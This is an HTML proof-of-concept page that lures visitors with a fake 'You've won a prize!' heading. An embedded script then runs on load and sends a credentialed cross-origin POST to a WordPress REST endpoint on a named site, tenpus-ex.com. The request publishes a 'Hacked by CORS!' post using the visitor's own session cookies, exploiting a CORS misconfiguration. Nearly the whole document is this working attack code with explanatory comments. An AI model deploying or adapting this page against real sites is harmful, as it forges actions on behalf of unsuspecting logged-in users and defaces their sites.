<html>
    <body>
        <h1>You've won a prize! Click here to claim it!</h1>
        <script>
            // This is the vulnerable API endpoint
            const url = 'https://tenpus-ex.com/wp-json/wp/v2/posts';
            
            // The data for the new post
            const postData = {
                title: 'Hacked by CORS!',
                content: 'This post was created through a CORS misconfiguration vulnerability.',
                status: 'publish' // Change to 'draft' if you don't want it to be public
            };

            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
            
            // This header is required by the WordPress API for POST requests
            xhr.setRequestHeader('X-WP-Nonce', 'your_nonce_token'); // You need a valid nonce. A nonce is a one-time token that WordPress uses to prevent Cross-Site Request Forgery (CSRF). 
            xhr.setRequestHeader('Content-Type', 'application/json');

            // This is the critical part - it sends the user's cookies with the request
            xhr.withCredentials = true;

            xhr.onreadystatechange = function() {
                if (this.readyState === 4) {
                    if (this.status === 201) {
                        console.log("Success! New post created: ", this.responseText);
                    } else {
                        console.error("Error: ", this.status, this.responseText);
                    }
                }
            };
            
            // Send the JSON data
            xhr.send(JSON.stringify(postData));

        </script>
        <p>Your browser is now creating a post on tenpus-ex.com using your session.</p>
    </body>
</html>
